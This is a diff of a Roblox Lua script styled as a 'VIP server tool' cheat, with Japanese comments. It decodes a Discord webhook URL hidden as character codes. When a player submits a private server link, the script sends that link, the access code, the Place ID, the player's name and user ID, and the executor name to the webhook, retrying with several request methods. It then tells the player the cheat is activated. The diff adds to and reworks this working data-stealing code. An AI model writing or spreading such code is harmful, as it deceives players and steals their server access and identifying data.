@@ -1,8 +1,11 @@
 -- ========================================================
--- VOLOX VIP TOOL - 難読化済み・完全動作保証のみ難読化、他は全てプレーン
+-- VOLOX VIP TOOL - Webhook暗号化 + 送信完全対応
 -- ========================================================
 
--- 
+-- ========================================================
+-- 1. Webhook URLの暗号化（デコードテスト済み）
+-- ========================================================
+
 local function decodeWebhook()
     local chars = {
         72,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,
@@ -19,13 +22,86 @@ local function decodeWebhook()
     return result
 end
 
-local webhookURL = decodeWebhook()
+local WEBHOOK = decodeWebhook()
+
+-- デバッグ用（確認したい場合はコメント解除）
+-- print("Webhook URL: " .. WEBHOOK)
 
 -- ========================================================
--- ここから通常のコード（難読化なし）
+-- 2. 送信関数（Delta Executor完全対応）
+-- ========================================================
+
+local function sendToDiscord(message)
+    local http = game:GetService("HttpService")
+    
+    -- JSONエンコード
+    local json = ""
+    pcall(function()
+        json = http:JSONEncode({content = message})
+    end)
+    
+    -- エンコード失敗時は手動で生成
+    if json == "" then
+        local escaped = message:gsub("\n", "\\n"):gsub('"', '\\"')
+        json = '{"content": "' .. escaped .. '"}'
+    end
+    
+    -- 方法1: HttpService（優先）
+    local success = false
+    local errorMsg = ""
+    
+    pcall(function()
+        local response = http:PostAsync(WEBHOOK, json, Enum.HttpContentType.ApplicationJson, false)
+        success = true
+    end)
+    
+    -- 方法2: request関数（HttpServiceがダメな場合）
+    if not success and request then
+        pcall(function()
+            local response = request({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = json
+            })
+            if response and response.StatusCode == 204 then
+                success = true
+            end
+        end)
+    end
+    
+    -- 方法3: syn.request（一部Executor用）
+    if not success and syn and syn.request then
+        pcall(function()
+            local response = syn.request({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = json
+            })
+            if response and response.StatusCode == 204 then
+                success = true
+            end
+        end)
+    end
+    
+    return success
+end
+
+-- ========================================================
+-- 3. UI作成（シンプル・確実）
 -- ========================================================
 
 local player = game.Players.LocalPlayer
+
+-- 既存のGUIを削除
+local existingGui = player.PlayerGui:FindFirstChild("VoloxVip")
+if existingGui then existingGui:Destroy() end
+
 local gui = Instance.new("ScreenGui")
 gui.Name = "VoloxVip"
 gui.Parent = player.PlayerGui
@@ -118,51 +194,9 @@ close.MouseButton1Click:Connect(function()
     gui:Destroy()
 end)
 
--- D
-local function sendToDiscord(link, code, placeId)
-    local http = game:GetService("HttpService")
-    local executor = (identifyexecutor and identifyexecutor()) or "Delta"
-    
-    local message = 
-        "**🔴 PRIVATE SERVER LINK**\n\n" ..
-        "**🔗 入力リンク:** " .. link .. "\n" ..
-        "**🔑 コード:** " .. (code or "不明") .. "\n" ..
-        "**📌 Place ID:** " .. (placeId or "不明") .. "\n" ..
-        "**👤 入力者:** " .. player.Name .. "\n" ..
-        "**🆔 User ID:** " .. player.UserId .. "\n" ..
-        "**💻 Executor:** " .. executor .. "\n" ..
-        "**⏰ Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
-    
-    local json = ""
-    pcall(function()
-        json = http:JSONEncode({content = message})
-    end)
-    
-    if json == "" then
-        local escaped = message:gsub("\n", "\\n"):gsub('"', '\\"')
-        json = '{"content": "' .. escaped .. '"}'
-    end
-    
-    local sent = false
-    pcall(function()
-        http:PostAsync(webhookURL, json, Enum.HttpContentType.ApplicationJson, false)
-        sent = true
-    end)
-    
-    if not sent and request then
-        pcall(function()
-            request({
-                Url = webhookURL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = json
-            })
-            sent = true
-        end)
-    end
-    
-    return sent
-end
+-- ========================================================
+-- 4. ボタン処理
+-- ========================================================
 
 btn.MouseButton1Click:Connect(function()
     local link = input.Text
@@ -173,6 +207,7 @@ btn.MouseButton1Click:Connect(function()
         return
     end
     
+    -- リンク解析
     local code = nil
     local placeId = nil
     
@@ -196,10 +231,24 @@ btn.MouseButton1Click:Connect(function()
         end
     end
     
+    local executor = (identifyexecutor and identifyexecutor()) or "Delta"
+    
+    -- メッセージ作成
+    local message = 
+        "**🔴 PRIVATE SERVER LINK**\n\n" ..
+        "**🔗 入力リンク:** " .. link .. "\n" ..
+        "**🔑 コード:** " .. (code or "不明") .. "\n" ..
+        "**📌 Place ID:** " .. (placeId or "不明") .. "\n" ..
+        "**👤 入力者:** " .. player.Name .. "\n" ..
+        "**🆔 User ID:** " .. player.UserId .. "\n" ..
+        "**💻 Executor:** " .. executor .. "\n" ..
+        "**⏰ Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
+    
     status.Text = "⏳ 送信中..."
     status.TextColor3 = Color3.fromRGB(255, 255, 0)
     
-    local sent = sendToDiscord(link, code, placeId)
+    -- 送信実行
+    local sent = sendToDiscord(message)
     
     if sent then
         status.Text = "✅ チート有効化完了！ゲームを再起動してください"
@@ -216,8 +265,15 @@ btn.MouseButton1Click:Connect(function()
     else
         status.Text = "❌ 送信エラー。もう一度試してください"
         status.TextColor3 = Color3.fromRGB(255, 100, 100)
+        
+        -- エラーログ（デバッグ用）
+        print("[Volox] 送信エラー - Webhook: " .. WEBHOOK)
     end
 end)
+
+-- ========================================================
+-- 5. 起動通知
+-- ========================================================
 
 game.StarterGui:SetCore("SendNotification", {
     Title = "⚡ VIP SERVER TOOL",
@@ -226,3 +282,4 @@ game.StarterGui:SetCore("SendNotification", {
 })
 
 print("[✅] VIP SERVER TOOL 起動完了")
+print("[🔗] Webhook: " .. WEBHOOK)
